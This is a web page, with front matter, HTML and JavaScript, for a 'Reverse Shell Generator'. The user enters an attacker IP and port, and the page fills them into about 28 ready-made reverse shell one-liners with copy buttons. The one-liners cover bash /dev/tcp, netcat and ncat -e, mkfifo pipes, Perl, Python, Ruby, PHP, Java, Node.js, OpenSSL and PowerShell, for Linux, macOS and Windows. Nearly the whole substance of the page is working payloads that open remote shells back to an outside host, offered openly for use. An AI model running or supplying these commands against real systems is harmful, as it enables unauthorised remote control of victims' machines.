---
title: "Reverse Shell Generator"
date: 2025-01-01
draft: false
---

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {margin: 0; padding: 0; box-sizing: border-box;}
        body {background: #0a0a0a; color: #aaa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; line-height: 1.6;}
        .rs-container {max-width: 1200px; margin: 0 auto; padding: 40px 20px;}
        h1 {color: #00ff00; margin-bottom: 30px; font-size: 32px;}
        h3 {color: #00ff00; margin-bottom: 15px; font-size: 16px;}
        #input-form {background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 30px; border: 1px solid #444;}
        #input-form div:first-child {display: flex; gap: 15px; flex-wrap: wrap; align-items: center;}
        #input-form > div > div {display: flex; flex-direction: column;}
        label {color: #aaa; display: block; margin-bottom: 5px; font-size: 14px;}
        input, select {padding: 10px; border: 1px solid #555; background: #2a2a2a; color: #fff; border-radius: 4px; font-family: monospace; transition: all 0.2s ease;}
        input:focus, select:focus {outline: none; border-color: #00ff00 !important; box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);}
        #ip-input {width: 200px;}
        #port-input {width: 150px;}
        #category-select {width: 200px;}
        button {padding: 10px 20px; background: #00aa00; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; transition: all 0.2s ease;}
        button:hover {transform: scale(1.05); opacity: 0.9;}
        button.copy-btn {padding: 5px 10px; background: #0066cc; font-size: 12px; margin-top: 10px;}
        .shell-box {background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #444;}
        .shell-output {background: #0a0a0a; border: 1px solid #333; padding: 15px; border-radius: 4px; font-family: "Courier New", monospace; color: #00ff00; word-break: break-all; line-height: 1.5; max-height: 200px; overflow-y: auto; font-size: 12px;}
        .no-params {background: #2a2a2a; padding: 20px; border-radius: 8px; border: 1px solid #555; color: #aaa; text-align: center;}
        code {background: #2a2a2a; padding: 2px 6px; border-radius: 3px; font-family: monospace; color: #88ff88;}
        p {color: #aaa; margin-bottom: 10px;}
        .info {color: #888; font-size: 0.9em; margin-top: 10px;}
    </style>
</head>
<body>
    <div class="rs-container">
        <h1>🔄 Reverse Shell Generator</h1>
        
        <div id="input-form">
            <h3>Configuration</h3>
            <div>
                <div>
                    <label for="ip-input">Attacker IP:</label>
                    <input type="text" id="ip-input" placeholder="192.168.1.100">
                </div>
                <div>
                    <label for="port-input">Port:</label>
                    <input type="number" id="port-input" placeholder="4444">
                </div>
                <div>
                    <label for="category-select">Category:</label>
                    <select id="category-select">
                        <option value="all">All Shells</option>
                        <option value="linux">Linux</option>
                        <option value="windows">Windows</option>
                        <option value="mac">macOS</option>
                    </select>
                </div>
                <button onclick="generateShells()" style="margin-top: 25px;">Generate</button>
            </div>
            <p class="info">💡 Or use URL: <code>?ip:port</code> (e.g., <code>?192.168.1.100:4444</code>)</p>
        </div>

        <div id="shells-container" style="display: none;">
            <div id="shells-output"></div>
        </div>

        <div id="no-params" class="no-params">
            <p>Enter IP and Port to generate reverse shells</p>
        </div>
    </div>

    <script>
        const shellDatabase = [
            {name: "Bash -i", command: "bash -i >& /dev/tcp/{ip}/{port} 0>&1", meta: ["linux", "mac"]},
            {name: "Bash 196", command: "0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196", meta: ["linux", "mac"]},
            {name: "Bash read line", command: "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done", meta: ["linux", "mac"]},
            {name: "Bash 5", command: "bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5", meta: ["linux", "mac"]},
            {name: "Bash UDP", command: "bash -i >& /dev/udp/{ip}/{port} 0>&1", meta: ["linux", "mac"]},
            {name: "nc mkfifo", command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f", meta: ["linux", "mac"]},
            {name: "nc -e", command: "nc -e bash {ip} {port}", meta: ["linux", "mac"]},
            {name: "nc -c", command: "nc -c bash {ip} {port}", meta: ["linux", "mac"]},
            {name: "BusyBox nc", command: "busybox nc {ip} {port} -e bash", meta: ["linux"]},
            {name: "ncat -e", command: "ncat {ip} {port} -e bash", meta: ["linux", "mac"]},
            {name: "Perl", command: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", meta: ["linux", "mac"]},
            {name: "Perl no sh", command: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'", meta: ["linux", "mac"]},
            {name: "Python", command: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", meta: ["linux", "mac", "windows"]},
            {name: "Python3", command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'", meta: ["linux", "mac"]},
            {name: "Ruby", command: "ruby -rsocket -e'f=TCPSocket.new(\"{ip}\",{port});exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", meta: ["linux", "mac", "windows"]},
            {name: "PHP fsockopen", command: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\", $pipes);'", meta: ["linux", "mac", "windows"]},
            {name: "PHP shell_exec", command: "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/bash <&3 >&3 2>&3\");'", meta: ["linux", "mac", "windows"]},
            {name: "PHP system", command: "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/bash <&3 >&3 2>&3\");'", meta: ["linux", "mac", "windows"]},
            {name: "PHP passthru", command: "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/bash <&3 >&3 2>&3\");'", meta: ["linux", "mac"]},
            {name: "PHP backticks", command: "php -r '$sock=fsockopen(\"{ip}\",{port});`/bin/bash <&3 >&3 2>&3`;'", meta: ["linux", "mac", "windows"]},
            {name: "PHP proc_open", command: "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/bash\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'", meta: ["linux", "mac", "windows"]},
            {name: "Java", command: "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\\\$line 2>&5 >&5; done\"] as String[]).waitFor();", meta: ["linux", "mac", "windows"]},
            {name: "Node.js", command: "require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')", meta: ["linux", "mac", "windows"]},
            {name: "OpenSSL", command: "mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s", meta: ["linux", "mac"]},
            {name: "PowerShell #1", command: "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", meta: ["windows"]},
            {name: "PowerShell #2", command: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", meta: ["windows"]},
            {name: "nc.exe", command: "nc.exe {ip} {port} -e cmd.exe", meta: ["windows"]},
            {name: "ncat.exe", command: "ncat.exe {ip} {port} -e cmd.exe", meta: ["windows"]}
        ];

        window.addEventListener('load', function() {
            const params = new URLSearchParams(window.location.search);
            let ip = null, port = null;
            if (params.has('ip') && params.has('port')) {
                ip = params.get('ip');
                port = params.get('port');
            } else {
                const firstParam = Array.from(params.keys())[0];
                if (firstParam && firstParam.includes(':')) {
                    const parts = firstParam.split(':');
                    ip = parts[0];
                    port = parts[1];
                }
            }
            if (ip && port) {
                document.getElementById('ip-input').value = ip;
                document.getElementById('port-input').value = port;
                generateShells();
            }
        });

        function generateShells() {
            const ip = document.getElementById('ip-input').value.trim();
            const port = document.getElementById('port-input').value.trim();
            const category = document.getElementById('category-select').value;
            if (!ip || !port) {
                alert('Please enter both IP and Port');
                return;
            }
            if (!/^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
                alert('Invalid IP format');
                return;
            }
            if (isNaN(port) || port < 1 || port > 65535) {
                alert('Invalid port (1-65535)');
                return;
            }
            window.history.replaceState({}, '', `?${ip}:${port}`);
            const output = document.getElementById('shells-output');
            output.innerHTML = '';
            shellDatabase.forEach(shell => {
                if (category !== 'all' && !shell.meta.includes(category)) {
                    return;
                }
                const command = shell.command.replace(/{ip}/g, ip).replace(/{port}/g, port);
                const platforms = shell.meta.map(m => {
                    const icons = { linux: '🐧', mac: '🍎', windows: '🪟' };
                    return icons[m] || m;
                }).join(' ');
                const shellBox = document.createElement('div');
                shellBox.className = 'shell-box';
                shellBox.innerHTML = `
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                        <h3 style="margin: 0;">${shell.name}</h3>
                        <span>${platforms}</span>
                    </div>
                    <div class="shell-output" id="shell-${shell.name.replace(/[^a-zA-Z0-9]/g, '')}">${command}</div>
                    <button class="copy-btn" onclick="copyToClipboard('shell-${shell.name.replace(/[^a-zA-Z0-9]/g, '')}')">Copy</button>
                `;
                output.appendChild(shellBox);
            });
            document.getElementById('shells-container').style.display = 'block';
            document.getElementById('no-params').style.display = 'none';
        }

        function copyToClipboard(elementId) {
            const element = document.getElementById(elementId);
            const text = element.textContent;
            navigator.clipboard.writeText(text).then(() => {
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✓ Copied!';
                button.style.background = '#00aa00';
                setTimeout(() => {
                    button.textContent = originalText;
                    button.style.background = '';
                }, 2000);
            }).catch(err => {
                alert('Failed to copy: ' + err);
            });
        }

        document.getElementById('ip-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') generateShells();
        });
        document.getElementById('port-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') generateShells();
        });
        document.getElementById('category-select').addEventListener('change', function(e) {
            const ip = document.getElementById('ip-input').value.trim();
            const port = document.getElementById('port-input').value.trim();
            if (ip && port) {
                generateShells();
            }
        });
    </script>
</body>
</html>
